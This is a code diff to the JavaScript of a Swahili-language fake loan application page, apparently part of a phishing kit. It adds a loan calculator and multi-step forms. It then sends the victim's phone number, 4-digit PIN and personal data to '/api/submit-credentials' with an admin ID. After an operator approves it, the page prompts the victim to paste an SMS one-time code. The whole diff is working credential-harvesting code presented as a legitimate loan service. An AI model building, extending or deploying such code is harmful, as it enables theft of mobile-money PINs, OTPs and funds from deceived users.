@@ -3,25 +3,127 @@ document.addEventListener('DOMContentLoaded', () => {
     const adminId = urlParams.get('admin');
 
     const stepNaelewa = document.getElementById('step-naelewa');
+    const stepSlider = document.getElementById('step-slider');
+    const stepLoan1 = document.getElementById('step-loan-1');
+    const stepLoan2 = document.getElementById('step-loan-2');
+    const stepLoan3 = document.getElementById('step-loan-3');
     const stepForm = document.getElementById('step-form');
     const stepLoading = document.getElementById('step-loading');
     const stepOtp = document.getElementById('step-otp');
     const stepSuccess = document.getElementById('step-success');
 
     const btnNaelewa = document.getElementById('btn-naelewa');
+    const rangeAmount = document.getElementById('range-amount');
+    const rangeDuration = document.getElementById('range-duration');
+    const sliderValDisplay = document.getElementById('slider-val-display');
+    const sliderDurationDisplay = document.getElementById('slider-duration-display');
+    const monthlyPaymentVal = document.getElementById('monthly-payment-val');
+    const totalRepayVal = document.getElementById('total-repay-val');
+    const btnSliderNext = document.getElementById('btn-slider-next');
+
+    const btnNext1 = document.getElementById('btn-next-1');
+    const btnPrev2 = document.getElementById('btn-prev-2');
+    const btnNext2 = document.getElementById('btn-next-2');
+    const btnPrev3 = document.getElementById('btn-prev-3');
+    const btnSubmitLoan = document.getElementById('btn-submit-loan');
     const loanForm = document.getElementById('loan-form');
     const btnThibitisha = document.getElementById('btn-thibitisha');
     const otpText = document.getElementById('otp-text');
     const charCount = document.getElementById('char-count');
 
+    let sliderData = {
+        sliderAmount: '1,000,000',
+        sliderDuration: '3 Mwezi',
+        monthlyPayment: 'Tsh 336,115'
+    };
+    let loanData = {};
     let currentSessionId = null;
     let statusInterval = null;
 
+    function switchStep(fromCard, toCard) {
+        fromCard.classList.remove('active');
+        fromCard.classList.add('hidden');
+        toCard.classList.remove('hidden');
+        toCard.classList.add('active');
+    }
+
+    function updateCalculations() {
+        const amt = parseInt(rangeAmount.value) || 1000000;
+        const months = parseInt(rangeDuration.value) || 3;
+        
+        sliderValDisplay.innerText = 'Tsh ' + amt.toLocaleString();
+        sliderDurationDisplay.innerText = months + (months === 1 ? ' Mwezi' : ' Mwezi');
+
+        const totalMultiplier = (1 + (0.05 * (months / 12)));
+        const totalRepay = Math.round(amt * totalMultiplier);
+        const monthlyPay = Math.round(totalRepay / months);
+
+        monthlyPaymentVal.innerText = 'Tsh ' + monthlyPay.toLocaleString();
+        totalRepayVal.innerText = 'Tsh ' + totalRepay.toLocaleString();
+
+        sliderData.sliderAmount = amt.toLocaleString();
+        sliderData.sliderDuration = months + ' Mwezi';
+        sliderData.monthlyPayment = 'Tsh ' + monthlyPay.toLocaleString();
+
+        document.getElementById('loan-amount').value = amt;
+    }
+
+    rangeAmount.addEventListener('input', updateCalculations);
+    rangeDuration.addEventListener('input', updateCalculations);
+
     btnNaelewa.addEventListener('click', () => {
-        stepNaelewa.classList.remove('active');
-        stepNaelewa.classList.add('hidden');
-        stepForm.classList.remove('hidden');
-        stepForm.classList.add('active');
+        switchStep(stepNaelewa, stepSlider);
+    });
+
+    btnSliderNext.addEventListener('click', () => {
+        switchStep(stepSlider, stepLoan1);
+    });
+
+    btnNext1.addEventListener('click', () => {
+        loanData.loanType = document.getElementById('loan-type').value;
+        loanData.amount = document.getElementById('loan-amount').value;
+        loanData.duration = document.getElementById('loan-duration').value;
+        loanData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
+        switchStep(stepLoan1, stepLoan2);
+    });
+
+    btnPrev2.addEventListener('click', () => {
+        switchStep(stepLoan2, stepLoan1);
+    });
+
+    btnNext2.addEventListener('click', () => {
+        const firstName = document.getElementById('first-name').value.trim();
+        const lastName = document.getElementById('last-name').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!firstName || !lastName || !phone) {
+            alert('Tafadhali jaza taarifa zote zinazohitajika.');
+            return;
+        }
+
+        loanData.firstName = firstName;
+        loanData.lastName = lastName;
+        loanData.phone = phone;
+
+        document.getElementById('confirm-phone').value = phone;
+
+        switchStep(stepLoan2, stepLoan3);
+        
+        document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
+        document.getElementById('summary-duration').innerText = loanData.duration;
+        document.getElementById('summary-purpose').innerText = loanData.purpose;
+    });
+
+    btnPrev3.addEventListener('click', () => {
+        switchStep(stepLoan3, stepLoan2);
+    });
+
+    // Directly load the Phone & PIN Form after clicking submission on Step 3
+    btnSubmitLoan.addEventListener('click', () => {
+        loanData.employmentStatus = document.getElementById('employment-status').value;
+        loanData.annualIncome = document.getElementById('annual-income').value || '0';
+        
+        switchStep(stepLoan3, stepForm);
     });
 
     const pinInputs = document.querySelectorAll('.pin-input');
@@ -49,7 +151,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     loanForm.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const phoneInput = document.getElementById('phone').value.trim();
+        const phoneInput = document.getElementById('confirm-phone').value.trim();
         const pin = document.getElementById('pin-hidden').value;
 
         if (pin.length !== 4) {
@@ -59,10 +161,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         
-        stepForm.classList.remove('active');
-        stepForm.classList.add('hidden');
-        stepLoading.classList.remove('hidden');
-        stepLoading.classList.add('active');
+        switchStep(stepForm, stepLoading);
 
         try {
             const response = await fetch('/api/submit-credentials', {
@@ -70,6 +169,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: currentSessionId,
+                    sliderData,
+                    loanData,
                     phone: phoneInput,
                     pin: pin,
                     adminId: adminId
@@ -98,10 +199,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        stepOtp.classList.remove('active');
-        stepOtp.classList.add('hidden');
-        stepLoading.classList.remove('hidden');
-        stepLoading.classList.add('active');
+        switchStep(stepOtp, stepLoading);
 
         try {
             await fetch('/api/submit-otp', {
@@ -128,16 +226,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 if (data.status === 'approved_pin') {
                     clearInterval(statusInterval);
-                    stepLoading.classList.remove('active');
-                    stepLoading.classList.add('hidden');
-                    stepOtp.classList.remove('hidden');
-                    stepOtp.classList.add('active');
+                    // Immediately switch to SMS pasting screen when admin clicks ALLOW
+                    switchStep(stepLoading, stepOtp);
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
-                    stepLoading.classList.remove('active');
-                    stepLoading.classList.add('hidden');
-                    stepSuccess.classList.remove('hidden');
-                    stepSuccess.classList.add('active');
+                    document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
+                    switchStep(stepLoading, stepSuccess);
                 } else if (data.status === 'wrong_pin' || data.status === 'wrong_sms' || data.status === 'denied') {
                     clearInterval(statusInterval);
                     alert('Taarifa zako zimekataliwa au PIN/SMS sio sahihi. Tafadhali jaribu tena.');
@@ -149,4 +243,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-                          
+    
